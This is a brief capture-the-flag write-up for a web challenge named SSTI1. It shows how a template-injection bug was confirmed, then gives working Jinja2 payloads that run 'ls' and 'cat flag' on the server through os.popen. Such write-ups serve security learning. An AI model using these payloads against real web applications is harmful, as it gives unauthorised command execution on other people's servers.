# SSTI1

*Category:* Web

---

# Description
> I made a cool website where you can announce whatever you want! Try it out!

---

# Attachment


---
# Solution

Testing {{7*'7'}} returns 7777777, indicating a Server-Side Template Injection (SSTI) vulnerability.

I found a SSTI payload on github and inputting `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` lists the files and we see a flag file.

Using `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}` reads the flag file and we get the flag.
